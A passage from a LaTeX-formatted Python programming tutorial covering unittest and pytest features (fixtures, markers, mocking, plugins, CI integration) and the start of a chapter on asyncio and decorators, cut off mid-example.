The simplest way to run tests is to include the following block at the
bottom of your test file:

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{\textquotesingle{}\_\_main\_\_\textquotesingle{}}\NormalTok{:}
\NormalTok{    unittest.main()}
\end{Highlighting}
\end{Shaded}

This will run all test methods in the file when the file is executed.

\section{Common Assertions}\label{common-assertions}

Here are some commonly used assertions provided by \texttt{unittest}:

\begin{itemize}
\tightlist
\item
  \texttt{assertEqual(a,\ b)}: Check if \texttt{a\ ==\ b}
\item
  \texttt{assertNotEqual(a,\ b)}: Check if \texttt{a\ !=\ b}
\item
  \texttt{assertTrue(x)}: Check if \texttt{x} is \texttt{True}
\item
  \texttt{assertFalse(x)}: Check if \texttt{x} is \texttt{False}
\item
  \texttt{assertIs(a,\ b)}: Check if \texttt{a} is \texttt{b}
\item
  \texttt{assertIsNot(a,\ b)}: Check if \texttt{a} is not \texttt{b}
\item
  \texttt{assertIsNone(x)}: Check if \texttt{x} is \texttt{None}
\item
  \texttt{assertIsNotNone(x)}: Check if \texttt{x} is not \texttt{None}
\item
  \texttt{assertIn(a,\ b)}: Check if \texttt{a} is in \texttt{b}
\item
  \texttt{assertNotIn(a,\ b)}: Check if \texttt{a} is not in \texttt{b}
\item
  \texttt{assertIsInstance(a,\ b)}: Check if \texttt{a} is an instance
  of \texttt{b}
\item
  \texttt{assertNotIsInstance(a,\ b)}: Check if \texttt{a} is not an
  instance of \texttt{b}
\end{itemize}

\subsection{Example}\label{example-11}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ TestAssertions(unittest.TestCase):}

    \KeywordTok{def}\NormalTok{ test\_assertions(}\VariableTok{self}\NormalTok{):}
        \VariableTok{self}\NormalTok{.assertEqual(}\DecValTok{1} \OperatorTok{+} \DecValTok{1}\NormalTok{, }\DecValTok{2}\NormalTok{)}
        \VariableTok{self}\NormalTok{.assertTrue(}\DecValTok{1} \OperatorTok{==} \DecValTok{1}\NormalTok{)}
        \VariableTok{self}\NormalTok{.assertFalse(}\DecValTok{1} \OperatorTok{==} \DecValTok{0}\NormalTok{)}
        \VariableTok{self}\NormalTok{.assertIs(}\VariableTok{None}\NormalTok{, }\VariableTok{None}\NormalTok{)}
        \VariableTok{self}\NormalTok{.assertIsNot(}\DecValTok{1}\NormalTok{, }\VariableTok{None}\NormalTok{)}
        \VariableTok{self}\NormalTok{.assertIsNone(}\VariableTok{None}\NormalTok{)}
        \VariableTok{self}\NormalTok{.assertIsNotNone(}\DecValTok{1}\NormalTok{)}
        \VariableTok{self}\NormalTok{.assertIn(}\DecValTok{1}\NormalTok{, [}\DecValTok{1}\NormalTok{, }\DecValTok{2}\NormalTok{, }\DecValTok{3}\NormalTok{])}
        \VariableTok{self}\NormalTok{.assertNotIn(}\DecValTok{4}\NormalTok{, [}\DecValTok{1}\NormalTok{, }\DecValTok{2}\NormalTok{, }\DecValTok{3}\NormalTok{])}
        \VariableTok{self}\NormalTok{.assertIsInstance(}\DecValTok{1}\NormalTok{, }\BuiltInTok{int}\NormalTok{)}
        \VariableTok{self}\NormalTok{.assertNotIsInstance(}\DecValTok{1}\NormalTok{, }\BuiltInTok{str}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Test Fixtures}\label{test-fixtures}

Test fixtures are used to provide a fixed baseline upon which tests can
run. This can include setting up databases, creating directories, or
starting services.

\subsection{Setup and Teardown}\label{setup-and-teardown}

\begin{itemize}
\tightlist
\item
  \texttt{setUp()}: This method is called before each test. It is used
  to set up any state specific to the test.
\item
  \texttt{tearDown()}: This method is called after each test. It is used
  to clean up any state that was set up in \texttt{setUp()}.
\end{itemize}

\subsection{Example}\label{example-12}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ TestWithFixtures(unittest.TestCase):}

    \KeywordTok{def}\NormalTok{ setUp(}\VariableTok{self}\NormalTok{):}
        \VariableTok{self}\NormalTok{.resource }\OperatorTok{=} \StringTok{"some setup resource"}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Setup: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{resource}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

    \KeywordTok{def}\NormalTok{ tearDown(}\VariableTok{self}\NormalTok{):}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"TearDown: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{resource}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
        \VariableTok{self}\NormalTok{.resource }\OperatorTok{=} \VariableTok{None}

    \KeywordTok{def}\NormalTok{ test\_something(}\VariableTok{self}\NormalTok{):}
        \VariableTok{self}\NormalTok{.assertIsNotNone(}\VariableTok{self}\NormalTok{.resource)}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Test: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{resource}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{\textquotesingle{}\_\_main\_\_\textquotesingle{}}\NormalTok{:}
\NormalTok{    unittest.main()}
\end{Highlighting}
\end{Shaded}

\section{Test Suites}\label{test-suites}

A test suite is a collection of test cases, test suites, or both. It is
used to aggregate tests that should be executed together.

\subsection{Example}\label{example-13}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ suite():}
\NormalTok{    suite }\OperatorTok{=}\NormalTok{ unittest.TestSuite()}
\NormalTok{    suite.addTest(TestStringMethods(}\StringTok{\textquotesingle{}test\_upper\textquotesingle{}}\NormalTok{))}
\NormalTok{    suite.addTest(TestStringMethods(}\StringTok{\textquotesingle{}test\_isupper\textquotesingle{}}\NormalTok{))}
\NormalTok{    suite.addTest(TestStringMethods(}\StringTok{\textquotesingle{}test\_split\textquotesingle{}}\NormalTok{))}
    \ControlFlowTok{return}\NormalTok{ suite}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{\textquotesingle{}\_\_main\_\_\textquotesingle{}}\NormalTok{:}
\NormalTok{    runner }\OperatorTok{=}\NormalTok{ unittest.TextTestRunner()}
\NormalTok{    runner.run(suite())}
\end{Highlighting}
\end{Shaded}

\section{Skipping Tests}\label{skipping-tests}

Tests can be skipped using the \texttt{unittest.skip} decorator or
methods like \texttt{unittest.skipIf} and \texttt{unittest.skipUnless}.

\subsection{Example}\label{example-14}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ TestSkipping(unittest.TestCase):}

    \AttributeTok{@unittest.skip}\NormalTok{(}\StringTok{"demonstrating skipping"}\NormalTok{)}
    \KeywordTok{def}\NormalTok{ test\_skip(}\VariableTok{self}\NormalTok{):}
        \VariableTok{self}\NormalTok{.fail(}\StringTok{"shouldn\textquotesingle{}t happen"}\NormalTok{)}

    \AttributeTok{@unittest.skipIf}\NormalTok{(}\DecValTok{1} \OperatorTok{==} \DecValTok{1}\NormalTok{, }\StringTok{"not testing"}\NormalTok{)}
    \KeywordTok{def}\NormalTok{ test\_skip\_if(}\VariableTok{self}\NormalTok{):}
        \VariableTok{self}\NormalTok{.fail(}\StringTok{"shouldn\textquotesingle{}t happen"}\NormalTok{)}

    \AttributeTok{@unittest.skipUnless}\NormalTok{(}\DecValTok{1} \OperatorTok{==} \DecValTok{1}\NormalTok{, }\StringTok{"not testing"}\NormalTok{)}
    \KeywordTok{def}\NormalTok{ test\_skip\_unless(}\VariableTok{self}\NormalTok{):}
        \VariableTok{self}\NormalTok{.assertTrue(}\VariableTok{True}\NormalTok{)}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{\textquotesingle{}\_\_main\_\_\textquotesingle{}}\NormalTok{:}
\NormalTok{    unittest.main()}
\end{Highlighting}
\end{Shaded}

\section{Expected Failures}\label{expected-failures}

Sometimes, a test is expected to fail. This can be indicated using the
\texttt{unittest.expectedFailure} decorator.

\subsection{Example}\label{example-15}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ TestExpectedFailure(unittest.TestCase):}

    \AttributeTok{@unittest.expectedFailure}
    \KeywordTok{def}\NormalTok{ test\_expected\_failure(}\VariableTok{self}\NormalTok{):}
        \VariableTok{self}\NormalTok{.assertEqual(}\DecValTok{1}\NormalTok{, }\DecValTok{0}\NormalTok{)}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{\textquotesingle{}\_\_main\_\_\textquotesingle{}}\NormalTok{:}
\NormalTok{    unittest.main()}
\end{Highlighting}
\end{Shaded}

\section{Mocking}\label{mocking}

The \texttt{unittest.mock} module allows you to replace parts of your
system under test and make assertions about how they have been used.

\subsection{Example}\label{example-16}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ unittest.mock }\ImportTok{import}\NormalTok{ MagicMock}

\KeywordTok{class}\NormalTok{ TestMocking(unittest.TestCase):}

    \KeywordTok{def}\NormalTok{ test\_mocking(}\VariableTok{self}\NormalTok{):}
\NormalTok{        mock }\OperatorTok{=}\NormalTok{ MagicMock()}
\NormalTok{        mock.method.return\_value }\OperatorTok{=} \StringTok{\textquotesingle{}foo\textquotesingle{}}
        \VariableTok{self}\NormalTok{.assertEqual(mock.method(), }\StringTok{\textquotesingle{}foo\textquotesingle{}}\NormalTok{)}
\NormalTok{        mock.method.assert\_called\_once()}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{\textquotesingle{}\_\_main\_\_\textquotesingle{}}\NormalTok{:}
\NormalTok{    unittest.main()}
\end{Highlighting}
\end{Shaded}

\section{Parameterized Tests}\label{parameterized-tests}

Parameterized tests allow you to run the same test with different
inputs.

\subsection{\texorpdfstring{Example using \texttt{parameterized}
package}{Example using parameterized package}}\label{example-using-parameterized-package}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ parameterized }\ImportTok{import}\NormalTok{ parameterized}

\KeywordTok{class}\NormalTok{ TestParameterized(unittest.TestCase):}

    \AttributeTok{@parameterized.expand}\NormalTok{([}
\NormalTok{        (}\StringTok{"foo"}\NormalTok{, }\StringTok{"foo"}\NormalTok{.upper(), }\StringTok{"FOO"}\NormalTok{),}
\NormalTok{        (}\StringTok{"bar"}\NormalTok{, }\StringTok{"bar"}\NormalTok{.upper(), }\StringTok{"BAR"}\NormalTok{),}
\NormalTok{        (}\StringTok{"baz"}\NormalTok{, }\StringTok{"baz"}\NormalTok{.upper(), }\StringTok{"BAZ"}\NormalTok{),}
\NormalTok{    ])}
    \KeywordTok{def}\NormalTok{ test\_upper(}\VariableTok{self}\NormalTok{, name, }\BuiltInTok{input}\NormalTok{, expected):}
        \VariableTok{self}\NormalTok{.assertEqual(}\BuiltInTok{input}\NormalTok{, expected)}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{\textquotesingle{}\_\_main\_\_\textquotesingle{}}\NormalTok{:}
\NormalTok{    unittest.main()}
\end{Highlighting}
\end{Shaded}

\section{\texorpdfstring{Running Tests with \texttt{unittest} Command
Line
Interface}{Running Tests with unittest Command Line Interface}}\label{running-tests-with-unittest-command-line-interface}

You can run tests using the command line interface provided by
\texttt{unittest}.

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{python} \AttributeTok{{-}m}\NormalTok{ unittest discover }\AttributeTok{{-}s}\NormalTok{ tests}
\end{Highlighting}
\end{Shaded}

\begin{itemize}
\tightlist
\item
  \texttt{-s}: Specifies the start directory for discovering tests.
\item
  \texttt{-p}: Specifies the pattern for test file discovery.
\end{itemize}

\section{Conclusion}\label{conclusion-31}

The \texttt{unittest} module in Python is a powerful and flexible
framework for testing. By understanding and utilizing its features, you
can create robust and maintainable test suites for your applications.
This tutorial covered the basics and some advanced features of
\texttt{unittest}, including test cases, test fixtures, test suites,
skipping tests, expected failures, mocking, and parameterized tests.

\bookmarksetup{startatroot}

\chapter{\texorpdfstring{Deep Dive into the \texttt{pytest} Module in
Python}{Deep Dive into the pytest Module in Python}}\label{deep-dive-into-the-pytest-module-in-python}

\texttt{pytest} is a powerful and flexible testing framework for Python.
It is widely used for writing simple unit tests as well as complex
functional tests. In this tutorial, we will explore \texttt{pytest} in
depth, covering its installation, basic usage, advanced features, and
best practices.

\section{Installation}\label{installation}

To install \texttt{pytest}, you can use \texttt{pip}:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install pytest}
\end{Highlighting}
\end{Shaded}

\section{Basic Usage}\label{basic-usage-2}

\subsection{Writing Tests}\label{writing-tests}

\texttt{pytest} identifies test files and test functions based on
specific naming conventions. By default, it looks for files matching
\texttt{test\_*.py} or \texttt{*\_test.py} patterns.

\subsection{Example}\label{example-17}

Create a file named \texttt{test\_example.py}:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ test\_addition():}
    \ControlFlowTok{assert} \DecValTok{1} \OperatorTok{+} \DecValTok{1} \OperatorTok{==} \DecValTok{2}

\KeywordTok{def}\NormalTok{ test\_subtraction():}
    \ControlFlowTok{assert} \DecValTok{1} \OperatorTok{{-}} \DecValTok{1} \OperatorTok{==} \DecValTok{0}
\end{Highlighting}
\end{Shaded}

\subsection{Running Tests}\label{running-tests-2}

To run the tests, simply use the \texttt{pytest} command in the
terminal:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pytest}
\end{Highlighting}
\end{Shaded}

\subsection{Output}\label{output}

When you run \texttt{pytest}, it will automatically discover and execute
all the tests in the current directory and its subdirectories. The
output will provide detailed information about the tests, including any
failures or errors.

\section{Assertions}\label{assertions}

\texttt{pytest} uses standard Python \texttt{assert} statements for
assertions. This makes the tests easy to write and understand.

\subsection{Example}\label{example-18}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ test\_string\_methods():}
\NormalTok{    s }\OperatorTok{=} \StringTok{"hello"}
    \ControlFlowTok{assert}\NormalTok{ s.upper() }\OperatorTok{==} \StringTok{"HELLO"}
    \ControlFlowTok{assert}\NormalTok{ s.islower()}
    \ControlFlowTok{assert}\NormalTok{ s.startswith(}\StringTok{"h"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Fixtures}\label{fixtures}

Fixtures are functions that provide a fixed baseline for tests. They are
used to set up and clean up resources needed by tests. Fixtures are
defined using the \texttt{@pytest.fixture} decorator.

\subsection{Example}\label{example-19}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ pytest}

\AttributeTok{@pytest.fixture}
\KeywordTok{def}\NormalTok{ sample\_data():}
    \ControlFlowTok{return}\NormalTok{ \{}\StringTok{"name"}\NormalTok{: }\StringTok{"pytest"}\NormalTok{, }\StringTok{"version"}\NormalTok{: }\StringTok{"6.2.5"}\NormalTok{\}}

\KeywordTok{def}\NormalTok{ test\_sample\_data(sample\_data):}
    \ControlFlowTok{assert}\NormalTok{ sample\_data[}\StringTok{"name"}\NormalTok{] }\OperatorTok{==} \StringTok{"pytest"}
    \ControlFlowTok{assert}\NormalTok{ sample\_data[}\StringTok{"version"}\NormalTok{] }\OperatorTok{==} \StringTok{"6.2.5"}
\end{Highlighting}
\end{Shaded}

\subsection{Using Fixtures}\label{using-fixtures}

Fixtures can be used by including them as arguments in test functions.
\texttt{pytest} will automatically recognize and provide the fixture
data.

\section{Parameterized Tests}\label{parameterized-tests-1}

Parameterized tests allow you to run the same test with different
inputs. This is useful for testing functions with multiple sets of
inputs and expected outputs.

\subsection{Example}\label{example-20}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ pytest}

\AttributeTok{@pytest.mark.parametrize}\NormalTok{(}\StringTok{"x, y, result"}\NormalTok{, [}
\NormalTok{    (}\DecValTok{1}\NormalTok{, }\DecValTok{2}\NormalTok{, }\DecValTok{3}\NormalTok{),}
\NormalTok{    (}\DecValTok{4}\NormalTok{, }\DecValTok{5}\NormalTok{, }\DecValTok{9}\NormalTok{),}
\NormalTok{    (}\DecValTok{10}\NormalTok{, }\DecValTok{11}\NormalTok{, }\DecValTok{21}\NormalTok{),}
\NormalTok{])}
\KeywordTok{def}\NormalTok{ test\_addition(x, y, result):}
    \ControlFlowTok{assert}\NormalTok{ x }\OperatorTok{+}\NormalTok{ y }\OperatorTok{==}\NormalTok{ result}
\end{Highlighting}
\end{Shaded}

\section{Grouping Tests}\label{grouping-tests}

You can group tests using classes. Test classes should not have an
\texttt{\_\_init\_\_} method.

\subsection{Example}\label{example-21}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ TestMathOperations:}

    \KeywordTok{def}\NormalTok{ test\_addition(}\VariableTok{self}\NormalTok{):}
        \ControlFlowTok{assert} \DecValTok{1} \OperatorTok{+} \DecValTok{1} \OperatorTok{==} \DecValTok{2}

    \KeywordTok{def}\NormalTok{ test\_subtraction(}\VariableTok{self}\NormalTok{):}
        \ControlFlowTok{assert} \DecValTok{2} \OperatorTok{{-}} \DecValTok{1} \OperatorTok{==} \DecValTok{1}
\end{Highlighting}
\end{Shaded}

\section{Markers}\label{markers}

Markers are used to label tests for specific purposes, such as grouping,
skipping, or executing under certain conditions.

\subsection{Example}\label{example-22}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ pytest}

\AttributeTok{@pytest.mark.slow}
\KeywordTok{def}\NormalTok{ test\_slow\_operation():}
    \ImportTok{import}\NormalTok{ time}
\NormalTok{    time.sleep(}\DecValTok{5}\NormalTok{)}
    \ControlFlowTok{assert} \VariableTok{True}
\end{Highlighting}
\end{Shaded}

\subsection{Running Marked Tests}\label{running-marked-tests}

You can run tests with specific markers using the \texttt{-m} option:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pytest} \AttributeTok{{-}m}\NormalTok{ slow}
\end{Highlighting}
\end{Shaded}

\subsection{Skipping Tests}\label{skipping-tests-1}

You can skip tests using the \texttt{@pytest.mark.skip} decorator or
conditionally with \texttt{@pytest.mark.skipif}.

\subsection{Example}\label{example-23}

\begin{Shaded}
\begin{Highlighting}[]
\AttributeTok{@pytest.mark.skip}\NormalTok{(reason}\OperatorTok{=}\StringTok{"Skipping this test for now"}\NormalTok{)}
\KeywordTok{def}\NormalTok{ test\_skip():}
    \ControlFlowTok{assert} \VariableTok{False}

\AttributeTok{@pytest.mark.skipif}\NormalTok{(}\DecValTok{1} \OperatorTok{==} \DecValTok{1}\NormalTok{, reason}\OperatorTok{=}\StringTok{"Conditional skip"}\NormalTok{)}
\KeywordTok{def}\NormalTok{ test\_conditional\_skip():}
    \ControlFlowTok{assert} \VariableTok{False}
\end{Highlighting}
\end{Shaded}

\section{Expected Failures}\label{expected-failures-1}

You can mark tests as expected to fail using the
\texttt{@pytest.mark.xfail} decorator.

\subsection{Example}\label{example-24}

\begin{Shaded}
\begin{Highlighting}[]
\AttributeTok{@pytest.mark.xfail}
\KeywordTok{def}\NormalTok{ test\_expected\_failure():}
    \ControlFlowTok{assert} \VariableTok{False}
\end{Highlighting}
\end{Shaded}

\section{Plugins}\label{plugins}

\texttt{pytest} has a rich ecosystem of plugins that extend its
functionality. Some popular plugins include:

\begin{itemize}
\tightlist
\item
  \texttt{pytest-cov}: For measuring code coverage.
\item
  \texttt{pytest-xdist}: For running tests in parallel.
\item
  \texttt{pytest-mock}: For mocking in tests.
\end{itemize}

\subsection{Installing Plugins}\label{installing-plugins}

Plugins can be installed using \texttt{pip}:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install pytest{-}cov pytest{-}xdist pytest{-}mock}
\end{Highlighting}
\end{Shaded}

\subsection{Using Plugins}\label{using-plugins}

Plugins are automatically recognized by \texttt{pytest} once installed.
You can use their features by following the respective plugin
documentation.

\subsection{\texorpdfstring{Example: Code Coverage with
\texttt{pytest-cov}}{Example: Code Coverage with pytest-cov}}\label{example-code-coverage-with-pytest-cov}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pytest} \AttributeTok{{-}{-}cov}\OperatorTok{=}\NormalTok{my\_module tests/}
\end{Highlighting}
\end{Shaded}

\section{\texorpdfstring{Customizing \texttt{pytest}
Configuration}{Customizing pytest Configuration}}\label{customizing-pytest-configuration}

You can customize \texttt{pytest} behavior using a configuration file
named \texttt{pytest.ini}, \texttt{tox.ini}, or \texttt{setup.cfg}.

\subsection{\texorpdfstring{Example
\texttt{pytest.ini}}{Example pytest.ini}}\label{example-pytest.ini}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{[pytest]}
\DataTypeTok{addopts }\OtherTok{=}\StringTok{ {-}ra {-}q}
\DataTypeTok{markers }\OtherTok{=}
\DataTypeTok{    slow: marks tests as slow (deselect with \textquotesingle{}{-}m "not slow"\textquotesingle{})}
\DataTypeTok{    smoke: marks tests as smoke tests}
\end{Highlighting}
\end{Shaded}

\subsection{Explanation}\label{explanation-1}

\begin{itemize}
\tightlist
\item
  \texttt{addopts}: Additional options to pass to \texttt{pytest}.
\item
  \texttt{markers}: Custom markers for organizing tests.
\end{itemize}

\section{Capturing Output}\label{capturing-output}

\texttt{pytest} captures output from \texttt{print} statements and logs
during test execution. You can view this output by using the \texttt{-s}
option.

\subsection{Example}\label{example-25}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pytest} \AttributeTok{{-}s}
\end{Highlighting}
\end{Shaded}

\section{Debugging Tests}\label{debugging-tests-1}

You can use the \texttt{-\/-pdb} option to drop into the Python debugger
(pdb) on test failures.

\subsection{Example}\label{example-26}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pytest} \AttributeTok{{-}{-}pdb}
\end{Highlighting}
\end{Shaded}

\section{Integrating with Continuous Integration (CI)
Systems}\label{integrating-with-continuous-integration-ci-systems}

\texttt{pytest} can be easily integrated with CI systems like Jenkins,
Travis CI, CircleCI, and GitHub Actions.

\subsection{Example: GitHub Actions}\label{example-github-actions}

Create a \texttt{.github/workflows/python-app.yml} file:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{name}\KeywordTok{:}\AttributeTok{ Python application}

\FunctionTok{on}\KeywordTok{:}\AttributeTok{ }\KeywordTok{[}\AttributeTok{push}\KeywordTok{]}

\FunctionTok{jobs}\KeywordTok{:}
\AttributeTok{  }\FunctionTok{build}\KeywordTok{:}

\AttributeTok{    }\FunctionTok{runs{-}on}\KeywordTok{:}\AttributeTok{ ubuntu{-}latest}

\AttributeTok{    }\FunctionTok{steps}\KeywordTok{:}
\AttributeTok{    }\KeywordTok{{-}}\AttributeTok{ }\FunctionTok{uses}\KeywordTok{:}\AttributeTok{ actions/checkout@v2}
\AttributeTok{    }\KeywordTok{{-}}\AttributeTok{ }\FunctionTok{name}\KeywordTok{:}\AttributeTok{ Set up Python}
\AttributeTok{      }\FunctionTok{uses}\KeywordTok{:}\AttributeTok{ actions/setup{-}python@v2}
\AttributeTok{      }\FunctionTok{with}\KeywordTok{:}
\AttributeTok{        }\FunctionTok{python{-}version}\KeywordTok{:}\AttributeTok{ }\StringTok{\textquotesingle{}3.x\textquotesingle{}}
\AttributeTok{    }\KeywordTok{{-}}\AttributeTok{ }\FunctionTok{name}\KeywordTok{:}\AttributeTok{ Install dependencies}
\FunctionTok{      run}\KeywordTok{: }\CharTok{|}
\NormalTok{        python {-}m pip install {-}{-}upgrade pip}
\NormalTok{        pip install pytest}
\AttributeTok{    }\KeywordTok{{-}}\AttributeTok{ }\FunctionTok{name}\KeywordTok{:}\AttributeTok{ Run tests}
\FunctionTok{      run}\KeywordTok{: }\CharTok{|}
\NormalTok{        pytest}
\end{Highlighting}
\end{Shaded}

\section{Advanced Features}\label{advanced-features}

\subsection{Assertions with Custom
Messages}\label{assertions-with-custom-messages}

You can provide custom messages for assertions to make the output more
informative.

\subsection{Example}\label{example-27}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ test\_custom\_message():}
    \ControlFlowTok{assert} \DecValTok{1} \OperatorTok{+} \DecValTok{1} \OperatorTok{==} \DecValTok{3}\NormalTok{, }\StringTok{"Expected result to be 3"}
\end{Highlighting}
\end{Shaded}

\subsection{\texorpdfstring{Using \texttt{pytest.raises} for Exception
Handling}{Using pytest.raises for Exception Handling}}\label{using-pytest.raises-for-exception-handling}

You can test for exceptions using the \texttt{pytest.raises} context
manager.

\subsection{Example}\label{example-28}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ test\_exception():}
    \ControlFlowTok{with}\NormalTok{ pytest.raises(}\PreprocessorTok{ZeroDivisionError}\NormalTok{):}
        \DecValTok{1} \OperatorTok{/} \DecValTok{0}
\end{Highlighting}
\end{Shaded}

\subsection{\texorpdfstring{Using \texttt{pytest.approx} for Floating
Point
Comparisons}{Using pytest.approx for Floating Point Comparisons}}\label{using-pytest.approx-for-floating-point-comparisons}

You can use \texttt{pytest.approx} for comparing floating-point numbers.

\subsection{Example}\label{example-29}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ test\_approx():}
    \ControlFlowTok{assert} \FloatTok{0.1} \OperatorTok{+} \FloatTok{0.2} \OperatorTok{==}\NormalTok{ pytest.approx(}\FloatTok{0.3}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Best Practices}\label{best-practices-1}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Use Descriptive Test Names}: Use descriptive names for test
  functions and methods to make the test purpose clear.
\item
  \textbf{Keep Tests Independent}: Ensure tests do not depend on each
  other. Each test should be able to run independently.
\item
  \textbf{Use Fixtures Wisely}: Use fixtures to manage setup and
  teardown of resources.
\item
  \textbf{Organize Tests}: Organize tests into directories and modules
  for better structure.
\item
  \textbf{Use Markers}: Use markers to categorize and select tests.
\item
  \textbf{Continuous Integration}: Integrate \texttt{pytest} with a CI
  system to automate testing.
\end{enumerate}

\section{Conclusion}\label{conclusion-32}

\texttt{pytest} is a powerful and flexible testing framework that makes
it easy to write and run tests. Its simple syntax, extensive features,
and rich ecosystem of plugins make it a popular choice for testing in
Python. By understanding and utilizing the features of \texttt{pytest},
you can create robust and maintainable test suites for your
applications.

\bookmarksetup{startatroot}

\chapter{Advanced Python Concepts}\label{advanced-python-concepts}

Exploring advanced Python concepts can significantly enhance the
functionality and efficiency of your code. This tutorial will cover
asynchronous programming with \texttt{asyncio}, decorators, generators,
and context managers using the \texttt{contextlib} library.

\subsection{\texorpdfstring{Asynchronous Programming with
\texttt{asyncio}}{Asynchronous Programming with asyncio}}\label{asynchronous-programming-with-asyncio}

Asynchronous programming allows your code to perform tasks concurrently,
improving efficiency, especially in I/O-bound operations.

\subsubsection{\texorpdfstring{Basics of
\texttt{asyncio}}{Basics of asyncio}}\label{basics-of-asyncio}

\texttt{asyncio} provides the necessary infrastructure for writing
single-threaded concurrent code using \texttt{async} and \texttt{await}
syntax.

\paragraph{Example: Basic Asynchronous
Function}\label{example-basic-asynchronous-function}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ asyncio}

\ControlFlowTok{async} \KeywordTok{def}\NormalTok{ say\_hello():}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Hello"}\NormalTok{)}
    \ControlFlowTok{await}\NormalTok{ asyncio.sleep(}\DecValTok{1}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"World"}\NormalTok{)}

\CommentTok{\# Running the asynchronous function}
\NormalTok{asyncio.run(say\_hello())}
\end{Highlighting}
\end{Shaded}

\subsubsection{Running Multiple Tasks
Concurrently}\label{running-multiple-tasks-concurrently}

You can run multiple asynchronous tasks concurrently using
\texttt{asyncio.gather}.

\paragraph{Example: Concurrent Tasks}\label{example-concurrent-tasks}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ asyncio}

\ControlFlowTok{async} \KeywordTok{def}\NormalTok{ task1():}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Start Task 1"}\NormalTok{)}
    \ControlFlowTok{await}\NormalTok{ asyncio.sleep(}\DecValTok{2}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"End Task 1"}\NormalTok{)}

\ControlFlowTok{async} \KeywordTok{def}\NormalTok{ task2():}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Start Task 2"}\NormalTok{)}
    \ControlFlowTok{await}\NormalTok{ asyncio.sleep(}\DecValTok{1}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"End Task 2"}\NormalTok{)}

\ControlFlowTok{async} \KeywordTok{def}\NormalTok{ main():}
    \ControlFlowTok{await}\NormalTok{ asyncio.gather(task1(), task2())}

\NormalTok{asyncio.run(main())}
\end{Highlighting}
\end{Shaded}

\subsection{Decorators}\label{decorators-1}

Decorators are a powerful tool for modifying the behavior of functions
or classes. They allow you to wrap another function to extend its
behavior without explicitly modifying it.

\subsubsection{Creating a Simple
Decorator}\label{creating-a-simple-decorator}

\paragraph{Example: Logging Decorator}\label{example-logging-decorator}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ logger(func):}
    \KeywordTok{def}\NormalTok{ wrapper(}\OperatorTok{*}\NormalTok{args, }\OperatorTok{**}\NormalTok{kwargs):}
